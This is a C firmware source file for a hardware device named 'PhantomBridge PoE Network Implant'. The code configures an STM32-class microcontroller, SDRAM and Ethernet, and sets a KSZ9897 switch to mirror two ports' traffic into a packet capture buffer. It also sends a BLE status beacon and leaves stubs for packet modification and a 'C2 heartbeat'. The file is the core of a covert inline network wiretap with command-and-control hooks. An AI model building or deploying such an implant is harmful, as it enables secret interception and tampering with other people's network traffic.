/*
 * main.c — PhantomBridge PoE Network Implant
 * Main entry point, boot sequence, and packet engine
 */

#include "board.h"
#include "registers.h"
#include "drivers/ksz9897.h"
#include "drivers/spi_flash.h"

/* ===== Global State ===== */
static volatile uint32_t systick_ms = 0;
static volatile uint8_t  poe_power_good = 0;

/* RX/TX descriptor rings (placed in SDRAM) */
static eth_rx_desc_t *rx_desc = (eth_rx_desc_t *)ETH_RX_DESC_BASE;
static eth_tx_desc_t *tx_desc = (eth_tx_desc_t *)ETH_TX_DESC_BASE;

/* Packet capture ring buffer (in SDRAM) */
static volatile uint8_t *capture_buf = (volatile uint8_t *)CAPTURE_BUF_BASE;
static volatile uint32_t capture_head = 0;
static volatile uint32_t capture_tail = 0;

/* Statistics */
static volatile uint32_t rx_packet_count = 0;
static volatile uint32_t tx_packet_count = 0;
static volatile uint32_t modified_count = 0;
static volatile uint32_t dropped_count = 0;
static volatile uint32_t capture_overflow = 0;

/* ===== SysTick ISR ===== */
void SysTick_Handler(void) {
    systick_ms++;
}

/* ===== System Clock Configuration ===== */
static void clock_init(void) {
    /* Step 1: Enable HSI and wait for ready */
    RCC_CR |= RCC_CR_HSION;
    while (!(RCC_CR & RCC_CR_HSIRDY));

    /* Step 2: Configure PLL1 (SYSCLK 480MHz) */
    RCC_PLLCKSELR = (PLL1_M << 0) | (PLL2_M << 8) | (PLL3_M << 16)
                  | (0 << 28); /* HSI as source */

    RCC_PLL1DIVR = ((PLL1_N - 1) << 0) | ((PLL1_P - 1) << 9)
                  | ((PLL1_Q - 1) << 16) | ((PLL1_R - 1) << 24);

    RCC_PLL2DIVR = ((PLL2_N - 1) << 0) | ((PLL2_P - 1) << 9);
    RCC_PLL3DIVR = ((PLL3_N - 1) << 0) | ((PLL3_P - 1) << 9);

    /* Step 3: Enable PLLs */
    RCC_CR |= RCC_CR_PLL1ON | RCC_CR_PLL2ON | RCC_CR_PLL3ON;
    while (!(RCC_CR & RCC_CR_PLL1RDY));
    while (!(RCC_CR & RCC_CR_PLL2RDY));
    while (!(RCC_CR & RCC_CR_PLL3RDY));

    /* Step 4: Set flash latency for 480MHz (7 wait states) */
    *(volatile uint32_t *)0x52002000 = 0x700; /* FLASH_ACR: LATENCY=7, ART enable */

    /* Step 5: Configure bus prescalers */
    /* D1: AHB = SYSCLK/2 = 240MHz */
    RCC_D1CFGR = (1 << 0) | (3 << 4) | (2 << 8); /* HPRE=/2, D1PPRE=/4, D1CPRE=/1 */
    RCC_D2CFGR = (3 << 4) | (2 << 8); /* D2PPRE1=/4, D2PPRE2=/2 */
    RCC_D3CFGR = (2 << 4); /* D3PPRE=/2 */

    /* Step 6: Switch SYSCLK to PLL1 */
    RCC_D1CFGR |= (3 << 0); /* SW = PLL1 */
    while (((RCC_D1CFGR >> 3) & 7) != 3); /* Wait for switch */

    /* Step 7: Enable ART accelerator and caches */
    SCB_MPU_SETUP();  /* Configure MPU for SDRAM region */
    *(volatile uint32_t *)0xE000ED18 |= (1 << 2); /* Enable D-cache */
    *(volatile uint32_t *)0xE000ED18 |= (1 << 9); /* Enable I-cache */
}

/* ===== MPU Setup for SDRAM ===== */
static void SCB_MPU_SETUP(void) {
    MPU_CTRL = 0; /* Disable MPU during config */

    /* Region 0: SDRAM - Normal memory, write-back, shareable */
    MPU_RNR = 0;
    MPU_RBAR = MPU_RBAR_BASE(SDRAM_BASE_ADDR) | (0 << 4); /* Valid, region 0 */
    MPU_RLAR = MPU_RLAR_LIMIT(SDRAM_BASE_ADDR + SDRAM_SIZE_BYTES - 1)
             | (0 << 4) | 1; /* Valid, region 0, Attribute index 0 */

    /* Attribute 0: Normal, write-back, transient, shareable */
    *(volatile uint32_t *)0xE000ED00 = /* MPU_MAIR0 */
        (0xBBUL << 0); /* Attr0: Normal, WB, RA, WA, Transient, Shareable */

    MPU_CTRL = MPU_CTRL_ENABLE | MPU_CTRL_PRIVDEFENA;
}

/* ===== GPIO Initialization ===== */
static void gpio_init(void) {
    /* Enable GPIO clocks */
    RCC_AHB4ENR |= (1 << 0) | (1 << 1) | (1 << 2) | (1 << 3) | (1 << 4);

    /* RGMII: PA0, PA1 (MDC/MDIO) - AF11 */
    GPIO_PIN_AF(GPIOA_BASE, ETH_MDC_PIN, 11);
    GPIO_PIN_AF(GPIOA_BASE, ETH_MDIO_PIN, 11);
    GPIO_PIN_MODE(GPIOA_BASE, ETH_MDC_PIN, GPIO_MODE_AF);
    GPIO_PIN_MODE(GPIOA_BASE, ETH_MDIO_PIN, GPIO_MODE_AF);
    GPIO_PIN_SPEED(GPIOA_BASE, ETH_MDC_PIN, GPIO_SPEED_VHIGH);
    GPIO_PIN_SPEED(GPIOA_BASE, ETH_MDIO_PIN, GPIO_SPEED_VHIGH);
    GPIO_PIN_PULL(GPIOA_BASE, ETH_MDIO_PIN, GPIO_PULL_UP); /* MDIO needs pull-up */

    /* RGMII TX: PA8-PA13 - AF11 */
    for (int i = 8; i <= 13; i++) {
        GPIO_PIN_AF(GPIOA_BASE, i, 11);
        GPIO_PIN_MODE(GPIOA_BASE, i, GPIO_MODE_AF);
        GPIO_PIN_SPEED(GPIOA_BASE, i, GPIO_SPEED_VHIGH);
    }

    /* RGMII RX: PB0-PB5 - AF11 */
    for (int i = 0; i <= 5; i++) {
        GPIO_PIN_AF(GPIOB_BASE, i, 11);
        GPIO_PIN_MODE(GPIOB_BASE, i, GPIO_MODE_AF);
        GPIO_PIN_SPEED(GPIOB_BASE, i, GPIO_SPEED_VHIGH);
    }

    /* SPI2: PB14(SCK), PB15(MOSI), PC4(MISO) - AF5 */
    GPIO_PIN_AF(GPIOB_BASE, FLASH_SCK_PIN, 5);
    GPIO_PIN_AF(GPIOB_BASE, FLASH_MOSI_PIN, 5);
    GPIO_PIN_AF(GPIOC_BASE, FLASH_MISO_PIN, 5);
    GPIO_PIN_MODE(GPIOB_BASE, FLASH_SCK_PIN, GPIO_MODE_AF);
    GPIO_PIN_MODE(GPIOB_BASE, FLASH_MOSI_PIN, GPIO_MODE_AF);
    GPIO_PIN_MODE(GPIOC_BASE, FLASH_MISO_PIN, GPIO_MODE_AF);
    GPIO_PIN_SPEED(GPIOB_BASE, FLASH_SCK_PIN, GPIO_SPEED_VHIGH);
    GPIO_PIN_SPEED(GPIOB_BASE, FLASH_MOSI_PIN, GPIO_SPEED_VHIGH);

    /* SPI2 CS: PC6 GPIO output */
    GPIO_PIN_MODE(GPIOC_BASE, FLASH_CS_PIN, GPIO_MODE_OUTPUT);
    GPIO_PIN_SPEED(GPIOC_BASE, FLASH_CS_PIN, GPIO_SPEED_VHIGH);
    GPIO_SET(GPIOC_BASE, FLASH_CS_PIN); /* CS# inactive (high) */

    /* UART4: PC1(TX), PC2(RX) - AF8 */
    GPIO_PIN_AF(GPIOC_BASE, BLE_UART_TX_PIN, 8);
    GPIO_PIN_AF(GPIOC_BASE, BLE_UART_RX_PIN, 8);
    GPIO_PIN_MODE(GPIOC_BASE, BLE_UART_TX_PIN, GPIO_MODE_AF);
    GPIO_PIN_MODE(GPIOC_BASE, BLE_UART_RX_PIN, GPIO_MODE_AF);
    GPIO_PIN_SPEED(GPIOC_BASE, BLE_UART_TX_PIN, GPIO_SPEED_HIGH);
    GPIO_PIN_PULL(GPIOC_BASE, BLE_UART_RX_PIN, GPIO_PULL_UP);

    /* I2C1: PC3(SCL), PC4(SDA) - AF4 */
    GPIO_PIN_AF(GPIOC_BASE, POE_SCL_PIN, 4);
    GPIO_PIN_AF(GPIOC_BASE, POE_SDA_PIN, 4);
    GPIO_PIN_MODE(GPIOC_BASE, POE_SCL_PIN, GPIO_MODE_AF);
    GPIO_PIN_MODE(GPIOC_BASE, POE_SDA_PIN, GPIO_MODE_AF);
    GPIO_PIN_SPEED(GPIOC_BASE, POE_SCL_PIN, GPIO_SPEED_HIGH);
    GPIO_PIN_PULL(GPIOC_BASE, POE_SCL_PIN, GPIO_PULL_UP);
    GPIO_PIN_PULL(GPIOC_BASE, POE_SDA_PIN, GPIO_PULL_UP);

    /* FMC: All PD and PE pins for SDRAM - AF12 */
    for (int i = 0; i <= 15; i++) {
        GPIO_PIN_AF(GPIOD_BASE, i, 12);
        GPIO_PIN_MODE(GPIOD_BASE, i, GPIO_MODE_AF);
        GPIO_PIN_SPEED(GPIOD_BASE, i, GPIO_SPEED_VHIGH);
    }
    for (int i = 0; i <= 15; i++) {
        GPIO_PIN_AF(GPIOE_BASE, i, 12);
        GPIO_PIN_MODE(GPIOE_BASE, i, GPIO_MODE_AF);
        GPIO_PIN_SPEED(GPIOE_BASE, i, GPIO_SPEED_VHIGH);
    }
}

/* ===== SDRAM Initialization ===== */
static void sdram_init(void) {
    /* Enable FMC clock */
    RCC_AHB3ENR |= (1 << 1); /* FMCEN */

    /* Configure SDRAM Control Register 1 */
    FMC_SDCR1 = (0 << 0)   /* NC = 8-bit column (NC=00) */
              | (1 << 2)   /* NR = 12-bit row (NR=01 for 13-bit) */
              | (1 << 4)   /* MWD = 32-bit memory width */
              | (2 << 7)   /* CL = CAS Latency 3 */
              | (0 << 10)  /* NB = 4 banks */
              | (2 << 12); /* SDCLK = 2x HCLK */

    /* Configure SDRAM Timing Register 1 */
    FMC_SDTR1 = (SDRAM_TMRD  << 0)   /* TMRD: Load Mode Register to Active */
              | (SDRAM_TXSR  << 4)   /* TXSR: Exit self-refresh */
              | (SDRAM_TRAS  << 8)   /* TRAS: Self-refresh time */
              | (SDRAM_TRC   << 12)  /* TRC: Row cycle delay */
              | (SDRAM_TRCD  << 16)  /* TRCD: RAS-to-CAS delay */
              | (SDRAM_TRFC  << 20)  /* TRFC: Row refresh cycle */
              | (SDRAM_TRP   << 24); /* TRP: Row precharge delay */

    /* SDRAM initialization sequence */
    /* Step 1: Clock configuration enable */
    FMC_SDCMR = FMC_SDCMR_MODE_CLK_EN | FMC_SDCMR_BANK_1;
    for (volatile int i = 0; i < 10000; i++); /* Wait ~100µs */

    /* Step 2: Precharge all banks */
    FMC_SDCMR = FMC_SDCMR_MODE_PALL | FMC_SDCMR_BANK_1;
    for (volatile int i = 0; i < 1000; i++);

    /* Step 3: Auto-refresh (2 cycles) */
    FMC_SDCMR = FMC_SDCMR_MODE_AUTOREF | FMC_SDCMR_BANK_1 | (2 << 5);
    for (volatile int i = 0; i < 1000; i++);

    /* Step 4: Load Mode Register */
    FMC_SDCMR = FMC_SDCMR_MODE_LOAD_MR | FMC_SDCMR_BANK_1
              | FMC_SDCMR_MRD(SDRAM_MR_VALUE);
    for (volatile int i = 0; i < 1000; i++);

    /* Step 5: Set refresh rate */
    FMC_SDRTR = SDRAM_TREFI;
}

/* ===== ETH MAC DMA Initialization ===== */
static void eth_init(void) {
    /* Enable ETH MAC clock */
    RCC_AHB1ENR |= (1 << 15); /* ETHMACEN */
    RCC_AHB1ENR |= (1 << 16); /* ETHMACTXEN */
    RCC_AHB1ENR |= (1 << 17); /* ETHMACRXEN */

    /* Software reset */
    ETH_DMAMR |= ETH_DMAMR_SWR;
    while (ETH_DMAMR & ETH_DMAMR_SWR);

    /* Initialize RX descriptor ring */
    for (int i = 0; i < ETH_RX_DESC_COUNT; i++) {
        rx_desc[i].rdes0 = ETH_DESC_OWN; /* DMA owns descriptor */
        rx_desc[i].rdes1 = (uint32_t)(ETH_RX_BUF_BASE + i * ETH_RX_BUF_SIZE);
        rx_desc[i].rdes2 = 0;
        rx_desc[i].rdes3 = (ETH_RX_BUF_SIZE & 0xFFFF);
    }

    /* Initialize TX descriptor ring */
    for (int i = 0; i < ETH_TX_DESC_COUNT; i++) {
        tx_desc[i].tdes0 = 0;
        tx_desc[i].tdes1 = (uint32_t)(ETH_TX_BUF_BASE + i * ETH_TX_BUF_SIZE);
        tx_desc[i].tdes2 = 0;
        tx_desc[i].tdes3 = 0;
    }

    /* Set DMA descriptor list addresses */
    ETH_DMACRDLAR = (uint32_t)rx_desc;
    ETH_DMACTDLAR = (uint32_t)tx_desc;

    /* Configure MAC: Full duplex, 1Gbps */
    ETH_MACCR = ETH_MACCR_DM | ETH_MACCR_FES | ETH_MACCR_GPSLCE;

    /* Set MAC address (locally administered) */
    ETH_MACA0LR = 0x0000BE5A;  /* Low: 5A:BE:00:00 */
    ETH_MACA0HR = 0x00008000;  /* High: 00:00, with local admin bit */

    /* Enable DMA interrupts */
    ETH_DMAIER = (1 << 0)  /* Receive interrupt */
               | (1 << 1)  /* Transmit interrupt */
               | (1 << 3)  /* Receive buffer unavailable */
               | (1 << 10); /* Early receive interrupt */

    /* Enable receiver and transmitter */
    ETH_MACCR |= ETH_MACCR_RE | ETH_MACCR_TE;

    /* Start DMA */
    ETH_DMACRXCR |= ETH_DMACRXCR_SR;
    ETH_DMACTXCR |= ETH_DMACTXCR_ST;
}

/* ===== UART4 (BLE) Initialization ===== */
static void uart4_init(void) {
    /* Enable UART4 clock */
    RCC_APB1LENR |= (1 << 19); /* UART4EN */

    /* Disable UART for configuration */
    UART4_CR1 &= ~UART_CR1_UE;

    /* Configure baud rate: APB1CLK / BRR = baud */
    /* APB1 = 120MHz, target = 115200 */
    /* BRR = 120000000 / 115200 ≈ 1042 = 0x412 */
    UART4_BRR = 0x412;

    /* 8 data bits, no parity, 1 stop bit */
    UART4_CR1 = UART_CR1_TE | UART_CR1_RE;

    /* Enable UART */
    UART4_CR1 |= UART_CR1_UE;

    /* Enable RX interrupt */
    UART4_CR1 |= UART_CR1_RXNEIE;
    NVIC_ISER0 |= (1 << 52); /* UART4 IRQ = 52 */
}

/* ===== I2C1 (PoE) Initialization ===== */
static void i2c1_init(void) {
    /* Enable I2C1 clock */
    RCC_APB1LENR |= (1 << 21); /* I2C1EN */

    /* Disable I2C */
    I2C1_CR1 &= ~I2C_CR1_PE;

    /* Configure timing for 400kHz at 120MHz APB1 */
    /* PRESC=0, SCLDEL=4, SDADEL=2, SCLH=30, SCLL=42 */
    I2C1_TIMINGR = (0 << 28) | (4 << 20) | (2 << 16) | (30 << 8) | 42;

    /* Enable I2C */
    I2C1_CR1 |= I2C_CR1_PE;
}

/* ===== I2C1 Read (PoE Telemetry) ===== */
static int i2c1_read(uint8_t dev_addr, uint8_t reg, uint8_t *buf, uint8_t len) {
    /* Wait if bus busy */
    while (I2C1_ISR & (1 << 15));

    /* Send register address */
    I2C1_CR2 = (dev_addr << 1) | (1 << 16) | (1 << 13) | (1 << 25); /* 1 byte, start, autoend */
    I2C1_TXDR = reg;
    while (!(I2C1_ISR & I2C1_ISR_TC) && !(I2C1_ISR & I2C1_ISR_NACKF));
    if (I2C1_ISR & I2C1_ISR_NACKF) { I2C1_ICR |= (1 << 4); return -1; }

    /* Read data */
    I2C1_CR2 = (dev_addr << 1) | 1 | (len << 16) | (1 << 13) | (1 << 25); /* Read, restart, autoend */
    for (int i = 0; i < len; i++) {
        while (!(I2C1_ISR & I2C1_ISR_RXNE));
        buf[i] = (uint8_t)I2C1_RXDR;
    }

    return 0;
}

/* ===== Check PoE Power Good ===== */
static void poe_check(void) {
    uint8_t status = 0;
    if (i2c1_read(TPS2378_I2C_ADDR, TPS2378_REG_STATUS, &status, 1) == 0) {
        poe_power_good = (status & 0x01) ? 1 : 0;
    }
}

/* ===== UART4 Send (BLE) ===== */
static void uart4_send(const uint8_t *data, uint16_t len) {
    for (uint16_t i = 0; i < len; i++) {
        while (!(UART4_ISR & (1 << 7))); /* Wait for TX empty */
        UART4_TDR = data[i];
    }
    while (!(UART4_ISR & (1 << 6))); /* Wait for TX complete */
}

/* ===== Packet Processing Engine ===== */
static int process_packet(uint8_t *pkt, uint16_t len) {
    /* Basic Ethernet frame parsing */
    if (len < 14) return 0; /* Too short, pass through */

    uint16_t ethertype = ((uint16_t)pkt[12] << 8) | pkt[13];

    /* Store in capture buffer */
    uint32_t next_head = (capture_head + len + 2) & (CAPTURE_BUF_SIZE - 1);
    if (next_head != capture_tail) {
        capture_buf[capture_head] = (len >> 8) & 0xFF;
        capture_buf[(capture_head + 1) & (CAPTURE_BUF_SIZE - 1)] = len & 0xFF;
        for (uint16_t i = 0; i < len; i++) {
            capture_buf[(capture_head + 2 + i) & (CAPTURE_BUF_SIZE - 1)] = pkt[i];
        }
        capture_head = next_head;
    } else {
        capture_overflow++;
    }

    rx_packet_count++;

    /* TODO: Apply rule engine here */
    /* For now: passive capture mode, no modification */
    (void)ethertype;

    return 0; /* 0 = pass through unmodified */
}

/* ===== ETH RX Interrupt Handler ===== */
void ETH_IRQHandler(void) {
    uint32_t isr = ETH_DMAISR;
    if (isr & (1 << 0)) { /* RX complete */
        /* Process all completed RX descriptors */
        for (int i = 0; i < ETH_RX_DESC_COUNT; i++) {
            if (!(rx_desc[i].rdes0 & ETH_DESC_OWN)) {
                /* MCU owns this descriptor - packet received */
                uint16_t pkt_len = rx_desc[i].rdes0 & 0x3FFF;
                uint8_t *pkt_buf = (uint8_t *)rx_desc[i].rdes1;

                int action = process_packet(pkt_buf, pkt_len);

                if (action == 0) {
                    /* Pass through: re-assign to DMA */
                    rx_desc[i].rdes0 = ETH_DESC_OWN;
                } else if (action == 1) {
                    /* Modified: forward modified packet via TX */
                    /* Find free TX descriptor */
                    for (int j = 0; j < ETH_TX_DESC_COUNT; j++) {
                        if (!(tx_desc[j].tdes0 & ETH_DESC_OWN)) {
                            tx_desc[j].tdes0 = ETH_DESC_OWN | ETH_DESC_FIRST | ETH_DESC_LAST;
                            tx_desc[j].tdes0 |= (pkt_len & 0x3FFF);
                            /* Trigger TX */
                            break;
                        }
                    }
                    rx_desc[i].rdes0 = ETH_DESC_OWN;
                    modified_count++;
                } else {
                    /* Drop */
                    rx_desc[i].rdes0 = ETH_DESC_OWN;
                    dropped_count++;
                }
            }
        }
    }
    /* Clear interrupt flags */
    ETH_DMAISR = isr;
}

/* ===== BLE UART RX Interrupt Handler ===== */
void UART4_IRQHandler(void) {
    if (UART4_ISR & (1 << 5)) { /* RXNE */
        uint8_t byte = (uint8_t)UART4_RDR;
        /* TODO: BLE protocol parser */
        (void)byte;
    }
    /* Clear flags */
    UART4_ICR = 0xFFFFFFFF;
}

/* ===== Main ===== */
int main(void) {
    /* Step 1: Configure system clocks */
    clock_init();

    /* Step 2: Configure SysTick for 1ms */
    SysTick_LOAD = (HCLK_FREQ_HZ / 1000) - 1;
    SysTick_VAL = 0;
    SysTick_CTRL = 0x07; /* Enable, interrupt, CPU clock */

    /* Step 3: Initialize GPIOs */
    gpio_init();

    /* Step 4: Initialize SDRAM */
    sdram_init();

    /* Step 5: Initialize SPI Flash */
    spi_flash_init();

    /* Step 6: Initialize ETH MAC/DMA */
    eth_init();

    /* Step 7: Initialize KSZ9897 Ethernet Switch */
    ksz9897_init();

    /* Configure port mirroring: Port1+Port2 → CPU (Port6/RGMII) */
    ksz9897_set_mirror(KSZ_MIRROR_EN | KSZ_MIRROR_PORT1_RX | KSZ_MIRROR_PORT1_TX
                     | KSZ_MIRROR_PORT2_RX | KSZ_MIRROR_PORT2_TX);

    /* Step 8: Initialize BLE UART */
    uart4_init();

    /* Step 9: Initialize I2C for PoE telemetry */
    i2c1_init();

    /* Step 10: Check PoE status */
    poe_check();

    /* Send BLE status message */
    const char status_msg[] = "PHANTOMBRIDGE:ONLINE\n";
    uart4_send((const uint8_t *)status_msg, sizeof(status_msg) - 1);

    /* ===== Main Loop ===== */
    uint32_t last_telemetry = 0;
    while (1) {
        /* Periodic PoE telemetry (every 5 seconds) */
        if (systick_ms - last_telemetry > 5000) {
            poe_check();
            last_telemetry = systick_ms;
        }

        /* Periodic C2 heartbeat */
        if (systick_ms % C2_HEARTBEAT_MS == 0) {
            /* TODO: Send heartbeat via ETH (C2 tunnel) or BLE */
        }

        /* Housekeeping */
        __WFI(); /* Wait for interrupt (low power) */
    }

    return 0;
}